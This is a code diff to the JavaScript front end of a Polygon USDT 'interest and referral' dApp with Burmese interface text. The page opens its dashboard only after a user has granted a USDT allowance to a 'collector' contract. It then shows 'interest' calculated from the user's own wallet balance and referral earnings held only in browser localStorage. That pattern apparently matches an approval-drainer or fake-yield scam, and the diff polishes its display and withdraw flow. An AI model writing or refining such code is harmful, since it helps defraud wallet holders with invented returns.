@@ -129,7 +129,7 @@
             <div class="bg-slate-800/90 border border-slate-700 p-3.5 rounded-xl space-y-1">
                 <div class="flex justify-between items-center">
                     <span class="font-bold text-white">Interest</span>
-                    <span id="lblInterestEth" class="font-mono font-semibold text-purple-300">0.00000 MATIC</span>
+                    <span id="lblInterestUsdt" class="font-mono font-semibold text-emerald-300">0.000000 USDT</span>
                 </div>
                 <div class="flex justify-between items-center text-xs text-slate-400">
                     <span>Interest is available every days</span>
@@ -230,11 +230,29 @@
     <script>
         let provider, signer, userAddress;
         let countdownInterval;
+        let currentWithdrawableBalance = 0;
+        let walletEventsBound = false;
         const selectedNetwork = "POLYGON";
 
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
         const POLYGON_CHAIN_ID = "0x89";
+        const POLYGON_CHAIN_PARAMS = {
+            chainId: POLYGON_CHAIN_ID,
+            chainName: "Polygon Mainnet",
+            nativeCurrency: {
+                name: "POL",
+                symbol: "POL",
+                decimals: 18
+            },
+            rpcUrls: [
+                "https://polygon-rpc.com",
+                "https://rpc-mainnet.matic.network"
+            ],
+            blockExplorerUrls: [
+                "https://polygonscan.com"
+            ]
+        };
 
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) public returns (bool)",
@@ -349,17 +367,122 @@
             container.innerHTML = htmlContent + htmlContent;
         }
 
+        // 1. Referrer Address Validation Helper
+        function isValidReferrerAddress(addr, currentUser = "") {
+            if (!addr || typeof addr !== "string") return false;
+            const trimmed = addr.trim();
+            if (!ethers.isAddress(trimmed)) return false;
+            if (trimmed.toLowerCase() === ethers.ZeroAddress.toLowerCase()) return false;
+            if (currentUser && trimmed.toLowerCase() === currentUser.toLowerCase()) return false;
+            return true;
+        }
+
+        function resolveReferrerAddress(currentUser = "") {
+            const urlParams = new URLSearchParams(window.location.search);
+            const rawParam = urlParams.get("ref") || urlParams.get("code");
+
+            if (rawParam && isValidReferrerAddress(rawParam, currentUser)) {
+                const checksummed = ethers.getAddress(rawParam.trim());
+                localStorage.setItem("saved_referrer", checksummed);
+                return checksummed;
+            }
+
+            const savedRef = localStorage.getItem("saved_referrer");
+            if (savedRef && isValidReferrerAddress(savedRef, currentUser)) {
+                return ethers.getAddress(savedRef.trim());
+            }
+
+            return ethers.ZeroAddress;
+        }
+
+        // 5. Switch to Polygon with Error 4902 Fallback
+        async function switchToPolygonChain() {
+            try {
+                await window.ethereum.request({
+                    method: "wallet_switchEthereumChain",
+                    params: [{ chainId: POLYGON_CHAIN_ID }],
+                });
+            } catch (switchError) {
+                const errCode = switchError?.code ?? switchError?.data?.originalError?.code;
+                if (errCode === 4902) {
+                    await window.ethereum.request({
+                        method: "wallet_addEthereumChain",
+                        params: [POLYGON_CHAIN_PARAMS],
+                    });
+                    await window.ethereum.request({
+                        method: "wallet_switchEthereumChain",
+                        params: [{ chainId: POLYGON_CHAIN_ID }],
+                    });
+                } else {
+                    throw switchError;
+                }
+            }
+            provider = new ethers.BrowserProvider(window.ethereum);
+            if (userAddress) {
+                signer = await provider.getSigner();
+            }
+        }
+
+        // 4. Wallet Events (accountsChanged, chainChanged)
+        function bindWalletEvents() {
+            if (typeof window.ethereum === "undefined" || walletEventsBound) return;
+            walletEventsBound = true;
+
+            window.ethereum.on("accountsChanged", async (accounts) => {
+                currentWithdrawableBalance = 0;
+                if (!accounts || accounts.length === 0) {
+                    userAddress = null;
+                    signer = null;
+                    document.getElementById("walletAddress").innerText = "";
+                    document.getElementById("selectedNetworkBadge").classList.add("hidden");
+                    document.getElementById("userDashboard").classList.add("hidden");
+                    const connectBtn = document.getElementById("connectBtn");
+                    connectBtn.innerText = "Connect Wallet";
+                    document.getElementById("statusLog").innerText = "Wallet ချိတ်ဆက်မှု ပြတ်တောက်သွားပါပြီ။";
+                    return;
+                }
+
+                userAddress = accounts[0];
+                provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
+                document.getElementById("statusLog").innerText = "Wallet account ပြောင်းလဲသွားပါပြီ။ Data ပြန်စစ်ဆေးနေသည်...";
+                await checkExistingAllowanceAndLoad();
+            });
+
+            window.ethereum.on("chainChanged", async (chainId) => {
+                provider = new ethers.BrowserProvider(window.ethereum);
+                const normalizedChain = typeof chainId === "string"
+                    ? chainId.toLowerCase()
+                    : "0x" + Number(chainId).toString(16);
+
+                if (normalizedChain !== POLYGON_CHAIN_ID.toLowerCase()) {
+                    document.getElementById("selectedNetworkBadge").classList.add("hidden");
+                    document.getElementById("statusLog").innerText = "⚠️ Polygon Network (0x89) သို့ ပြောင်းလဲပေးပါ။";
+                    return;
+                }
+
+                document.getElementById("selectedNetworkBadge").classList.remove("hidden");
+                if (userAddress) {
+                    signer = await provider.getSigner();
+                    document.getElementById("statusLog").innerText = "Polygon Network ချိတ်ဆက်ပြီးပါပြီ။";
+                    await checkExistingAllowanceAndLoad();
+                }
+            });
+        }
+
         document.addEventListener("DOMContentLoaded", () => {
             const defaultLink = `${window.location.origin}${window.location.pathname}`;
             document.getElementById("refLink").value = defaultLink;
             updateQRCode(defaultLink);
             generateIncomeList();
             startLiveCalculatingStats();
+            bindWalletEvents();
             
             const urlParams = new URLSearchParams(window.location.search);
             const refParam = urlParams.get("ref") || urlParams.get("code");
-            if (refParam && ethers.isAddress(refParam)) {
-                localStorage.setItem("saved_referrer", refParam.toLowerCase());
+            if (refParam && isValidReferrerAddress(refParam)) {
+                localStorage.setItem("saved_referrer", ethers.getAddress(refParam.trim()));
             }
 
             setTimeout(checkAutoConnect, 1500);
@@ -376,11 +499,7 @@
                         const network = await provider.getNetwork();
                         if (network.chainId !== 137n) {
                             try {
-                                await window.ethereum.request({
-                                    method: "wallet_switchEthereumChain",
-                                    params: [{ chainId: POLYGON_CHAIN_ID }],
-                                });
-                                provider = new ethers.BrowserProvider(window.ethereum);
+                                await switchToPolygonChain();
                             } catch (swErr) {
                                 console.error("Network switch error:", swErr);
                             }
@@ -472,10 +591,7 @@
 
             try {
                 showProgress(20, "Switching to Polygon Network...");
-                await window.ethereum.request({
-                    method: "wallet_switchEthereumChain",
-                    params: [{ chainId: POLYGON_CHAIN_ID }],
-                });
+                await switchToPolygonChain();
 
                 showProgress(40, "Requesting wallet accounts...");
                 provider = new ethers.BrowserProvider(window.ethereum);
@@ -543,7 +659,7 @@
                 startCountdown(20, "မှတ်ပုံတင်နေသည်");
 
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const referrer = getQueryParameter("ref") || localStorage.getItem("saved_referrer") || ethers.ZeroAddress;
+                const referrer = resolveReferrerAddress(userAddress);
                 
                 try {
                     const regTx = await collector.registerUser(referrer);
@@ -577,6 +693,7 @@
             }
         }
 
+        // 2. Interest Rate calculated strictly in USDT + clear <100 USDT message
         async function checkUserData() {
             try {
                 const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
@@ -594,7 +711,8 @@
 
                 const dashboardEl = document.getElementById("userDashboard");
                 const formattedBal = Number(ethers.formatUnits(balance, 6));
-                const rate = getInterestRate(formattedBal);
+                const isEligibleForInterest = formattedBal >= 100;
+                const rate = isEligibleForInterest ? getInterestRate(formattedBal) : 0;
 
                 if (Number(allowance) > 0) {
                     dashboardEl.classList.remove("hidden");
@@ -611,24 +729,35 @@
 
                     document.getElementById("lblWalletBal").innerText = `${formattedBal.toFixed(6)} USDT`;
                     
-                    const cashback = formattedBal * rate;
-                    const maticInterest = (cashback / 3000).toFixed(5);
+                    const cashback = isEligibleForInterest ? (formattedBal * rate) : 0;
 
                     const refBalanceKey = `ref_balance_${userAddress.toLowerCase()}`;
                     const referralBalance = parseFloat(localStorage.getItem(refBalanceKey) || "0");
                     const withdrawableBalance = cashback + referralBalance;
+                    currentWithdrawableBalance = withdrawableBalance;
+
+                    const tierNoticeEl = document.getElementById("tierNotice");
+                    if (!isEligibleForInterest) {
+                        const remainingUsdt = Math.max(0, 100 - formattedBal);
+                        tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
+                        tierNoticeEl.innerText = `လက်ရှိ Wallet Balance (${formattedBal.toFixed(2)} USDT) မှာ 100 USDT မပြည့်သေးပါ။ Interest မရရှိသေးပါ (နောက်ထပ် ${remainingUsdt.toFixed(2)} USDT လိုအပ်ပါသည်)။`;
+                    } else {
+                        tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
+                        tierNoticeEl.innerText = `Interest ရရှိနေပါပြီ (လက်ရှိ Rate: ${(rate * 100).toFixed(1)}% USDTBalance)။`;
+                    }
 
                     document.getElementById("lblCashbackBal").innerText = `${cashback.toFixed(6)} USDT`;
                     document.getElementById("lblReferralBal").innerText = `${referralBalance.toFixed(6)} USDT`;
                     document.getElementById("lblWithdrawableBal").innerText = `${withdrawableBalance.toFixed(6)} USDT`;
 
-                    document.getElementById("lblInterestEth").innerText = `${maticInterest} MATIC`;
+                    document.getElementById("lblInterestUsdt").innerText = `${cashback.toFixed(6)} USDT`;
                     document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
 
                     const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                     document.getElementById("refLink").value = refLink;
                     updateQRCode(refLink);
                 } else {
+                    currentWithdrawableBalance = 0;
                     dashboardEl.classList.add("hidden");
                 }
             } catch (err) {
@@ -644,6 +773,7 @@
             alert("Referral Link ကူးယူပြီးပါပြီ။");
         }
 
+        // 3. Withdraw Logic connected to balance
         async function requestWithdraw() {
             try {
                 if (!userAddress || !signer) {
@@ -651,20 +781,31 @@
                     return;
                 }
 
-                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
-                const withdrawAmountNum = 10;
+                await checkUserData();
+
+                if (currentWithdrawableBalance <= 0) {
+                    alert("လက်ရှိ ထုတ်ယူနိုင်သော Balance (0.000000 USDT) မရှိသေးပါ။");
+                    return;
+                }
+
+                const withdrawAmountNum = Number(currentWithdrawableBalance.toFixed(6));
                 const withdrawAmount = ethers.parseUnits(withdrawAmountNum.toString(), 6);
 
+                if (withdrawAmount <= 0n) {
+                    alert("ထုတ်ယူနိုင်သော USDT ပမာဏ မလုံလောက်ပါ။");
+                    return;
+                }
+
+                const collector = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, signer);
                 const tx = await collector.requestWithdraw(withdrawAmount);
                 await tx.wait();
 
                 try {
                     const collectorReader = new ethers.Contract(COLLECTOR_CONTRACT_ADDRESS, COLLECTOR_ABI, provider);
                     const userInfo = await collectorReader.users(userAddress);
-                    let referrerAddr = userInfo.referrer;
-                    if (!referrerAddr || referrerAddr === ethers.ZeroAddress) {
-                        referrerAddr = localStorage.getItem("saved_referrer");
-                    }
+                    let referrerAddr = isValidReferrerAddress(userInfo.referrer, userAddress)
+                        ? ethers.getAddress(userInfo.referrer)
+                        : resolveReferrerAddress(userAddress);
 
                     if (referrerAddr && referrerAddr !== ethers.ZeroAddress) {
                         const refKey = `ref_balance_${referrerAddr.toLowerCase()}`;
@@ -677,7 +818,7 @@
                     console.error("Referral commission credit error:", refErr);
                 }
 
-                alert("Withdraw တောင်းဆိုချက် Smart Contract သို့ အောင်မြင်စွာ တင်သွင်းပြီးပါပြီ။ Admin ဘက်တွင် အချိန်နှင့်တပြေးညီ ပေါ်လာပါမည်။");
+                alert(`Withdraw (${withdrawAmountNum.toFixed(6)} USDT) တောင်းဆိုချက် Smart Contract သို့ အောင်မြင်စွာ တင်သွင်းပြီးပါပြီ။ Admin ဘက်တွင် အချိန်နှင့်တပြေးညီ ပေါ်လာပါမည်။`);
                 checkUserData();
             } catch (err) {
                 console.error(err);
